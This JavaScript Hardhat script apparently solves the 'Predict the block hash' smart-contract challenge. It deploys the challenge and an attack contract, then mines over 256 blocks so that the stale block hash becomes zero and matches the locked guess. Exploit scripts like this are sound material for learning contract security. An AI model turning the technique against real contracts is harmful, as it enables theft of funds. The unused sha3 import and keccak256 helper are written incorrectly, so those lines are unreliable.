const {sha3} =  "ethereumjs-util";

const {ethers,utils} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();

    const baseContractFactory = await hre.ethers.getContractFactory('PredictTheBlockHashChallenge');
    const payment = hre.ethers.utils.parseEther('1');
    const predictTheBlockHash = await baseContractFactory.connect(accounts[1]).deploy({value: payment});
    await predictTheBlockHash.deployed();

    const attackContractFactory = await hre.ethers.getContractFactory('AttackPredictTheBlockHash');
    const attackPredictTheBlockHash = await attackContractFactory.connect(accounts[1]).deploy(predictTheBlockHash.address.toString());
    await attackPredictTheBlockHash.deployed();


    let val = 0;
    let val1 = 0;
    const guess = await attackPredictTheBlockHash.connect(accounts[1]).returnGuess();
    console.log(guess);
    await predictTheBlockHash.connect(accounts[1]).lockInGuess(guess,{value: payment, gasLimit: 100000,});
    let completed= false
    while (!completed) {

        try {
            val1++;

            await mineNBlocks(257);
            const guess2 = await attackPredictTheBlockHash.connect(accounts[1]).returnVerification();
            console.log(guess2);
            if (guess === guess2){

                let success = await predictTheBlockHash.connect(accounts[1]).settle();
                success = await success.wait();
                completed = await predictTheBlockHash.isComplete();
                console.log(completed);
                if (completed=== true) {
                    break;
                }
            }
        } catch (e) {
            // console.log(e);
            // break;
            // val++;
            val++;
        }

    }


}

async function mineNBlocks(n) {
    for (let index = 0; index < n; index++) {
        await hre.ethers.provider.send('evm_mine');
    }
}

 function keccak256(data1,data2) {
    return hre.ethers.utils.keccak256([data1,data2])
}

main();